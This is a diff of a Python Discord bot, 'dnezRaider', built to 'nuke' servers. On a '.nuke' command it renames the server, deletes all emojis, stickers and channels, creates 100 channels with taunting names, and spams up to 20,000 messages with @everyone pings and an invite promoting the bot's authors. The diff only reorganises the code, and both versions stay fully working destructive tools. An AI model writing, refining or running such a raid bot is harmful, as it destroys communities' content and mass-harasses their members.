@@ -1,17 +1,26 @@
-# dnezRaider - Custom nuke bot (ULTIMATE EDITION)
+# dnezRaider - Custom nuke bot
 
 import asyncio
 import discord
 from discord.ext import commands
 import random
 import time
-import os
 
 # --- CONFIGURE THESE ---
-BOT_TOKEN = os.getenv("TOKEN", "PUT YOUR BOT TOKEN HERE")
+BOT_TOKEN = "PUT YOUR BOT TOKEN HERE!"
 PREFIX = "."
 
-# Channel names (the fancy ones u gave)
+# Nuke Configuration
+CHANNEL_NAME = "nuked"  # fallback (not used if random names are on)
+MESSAGE = """# NUKED BY N3XL 
+N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
+https://discord.gg/pbtxaTf8Q4
+https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
+||@everyone|| ||@here||"""
+AMOUNT_OF_CHANNELS = 100
+AMOUNT_OF_MESSAGES = 20000  # ← CHANGED from 1000 to 20000
+
+# Random channel name variations
 RANDOM_CHANNEL_NAMES = [
     "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
     "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
@@ -23,28 +32,15 @@ RANDOM_CHANNEL_NAMES = [
     "dєstrσчєd",
     "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
 ]
-USE_RANDOM_NAMES = True   # use random fancy names from above
-CHANNEL_NAME = "nuked"   # fallback if random disabled
 
-# The spam message (exactly as u gave)
-MESSAGE = """# NUKED BY N3XL 
-N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
-https://discord.gg/pbtxaTf8Q4
-https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
-||@everyone|| ||@here||"""
-
-AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 200   # each channel gets 200 messages
-AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL   # 20000 total
-
-# New server name after nuke
-NEW_SERVER_NAME = "TAMED BY N3XEL"
+USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only
 
 # -----------------------
 # DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
 # -----------------------
 
 def get_channel_name():
+    """Get channel name (random or fixed)"""
     if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
         return random.choice(RANDOM_CHANNEL_NAMES)
     return CHANNEL_NAME
@@ -53,34 +49,13 @@ intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
 intents.message_content = True
-intents.emojis_and_stickers = True
+intents.emojis = True          # to see emojis
+intents.guild_stickers = True  # to see stickers
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-async def delete_all_emojis(guild):
-    emojis = guild.emojis
-    if not emojis:
-        return
-    print(f"deleting {len(emojis)} emojis")
-    await asyncio.gather(*(e.delete() for e in emojis), return_exceptions=True)
-    print("emojis gone")
-
-async def delete_all_stickers(guild):
-    stickers = guild.stickers
-    if not stickers:
-        return
-    print(f"deleting {len(stickers)} stickers")
-    await asyncio.gather(*(s.delete() for s in stickers), return_exceptions=True)
-    print("stickers gone")
-
-async def rename_guild(guild):
-    try:
-        await guild.edit(name=NEW_SERVER_NAME)
-        print(f"server renamed to {NEW_SERVER_NAME}")
-    except Exception as e:
-        print(f"rename failed: {e}")
-
 async def send_messages_fast(channels, message, total):
+    """Send messages with rate limiting using semaphore"""
     if not channels:
         return
     
@@ -101,21 +76,53 @@ async def send_messages_fast(channels, message, total):
     await asyncio.gather(*tasks, return_exceptions=True)
 
 async def nuke_server(guild: discord.Guild):
+    """Main nuke logic - rename server, delete emojis/stickers, delete channels, create new ones, spam"""
     print(f"Starting nuke on {guild.name} ({guild.id})")
     start_time = time.perf_counter()
 
-    # Delete emojis & stickers
-    await delete_all_emojis(guild)
-    await delete_all_stickers(guild)
+    # Step 1: Rename server
+    try:
+        await guild.edit(name="<<[ TAMED BY N3XEL]>>")
+        print("Server renamed.")
+    except Exception as e:
+        print(f"Failed to rename server: {e}")
 
-    # Delete all channels
+    # Step 2: Delete all emojis
+    print("Deleting all emojis...")
+    emoji_tasks = []
+    for emoji in guild.emojis:
+        try:
+            emoji_tasks.append(emoji.delete())
+        except Exception:
+            pass
+    if emoji_tasks:
+        await asyncio.gather(*emoji_tasks, return_exceptions=True)
+        print("Emojis deleted.")
+    else:
+        print("No emojis to delete.")
+
+    # Step 3: Delete all stickers
+    print("Deleting all stickers...")
+    sticker_tasks = []
+    for sticker in guild.stickers:
+        try:
+            sticker_tasks.append(sticker.delete())
+        except Exception:
+            pass
+    if sticker_tasks:
+        await asyncio.gather(*sticker_tasks, return_exceptions=True)
+        print("Stickers deleted.")
+    else:
+        print("No stickers to delete.")
+
+    # Step 4: Delete all channels
     print("Deleting all channels...")
     await asyncio.gather(
         *(channel.delete() for channel in guild.channels),
         return_exceptions=True
     )
 
-    # Create new channels
+    # Step 5: Create new channels
     print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
     async def create_raid_channel():
         return await guild.create_text_channel(get_channel_name())
@@ -125,14 +132,11 @@ async def nuke_server(guild: discord.Guild):
         return_exceptions=True
     )
 
-    # Send messages
+    # Step 6: Send messages
     text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
     if text_channels:
-        print(f"Sending {AMOUNT_OF_MESSAGES} messages ({MESSAGES_PER_CHANNEL} per channel)...")
+        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
         await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
-
-    # Rename server
-    await rename_guild(guild)
 
     elapsed = time.perf_counter() - start_time
     print(f"Nuke completed in {elapsed:.2f} seconds!")
@@ -146,30 +150,32 @@ async def on_ready():
 
 @bot.command(name="nuke")
 async def nuke(ctx):
+    """Nuke the current server"""
+    # Check if user has administrator permission
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ You need Administrator permission to use this command!")
         return
-    await ctx.send("eto na mga pukinangina)")
+
+    # Confirm the nuke
+    await ctx.send("💣 Nuking server in progress...")
+    
+    # Execute the nuke
     await nuke_server(ctx.guild)
 
 @bot.command(name="config")
 async def config(ctx):
+    """Show current configuration"""
     config_msg = f"""
 **Current Configuration:**
-📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} fancy variants`
+📝 Channel Name: `{CHANNEL_NAME}`
 🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
-💬 Message Preview: `{MESSAGE[:60]}...`
+💬 Message: `{MESSAGE[:50]}...`
 📊 Channels: `{AMOUNT_OF_CHANNELS}`
-📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
-📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
-🏷️ New Server Name: `{NEW_SERVER_NAME}`
+📨 Messages: `{AMOUNT_OF_MESSAGES}`
     """
     await ctx.send(config_msg)
 
 if __name__ == "__main__":
-    if BOT_TOKEN == "PUT YOUR BOT TOKEN HERE" and not os.getenv("TOKEN"):
-        print("❌ Set your TOKEN environment variable or hardcode it.")
-        exit(1)
     print("Starting Nuke Bot...")
     print("=" * 50)
     bot.run(BOT_TOKEN)
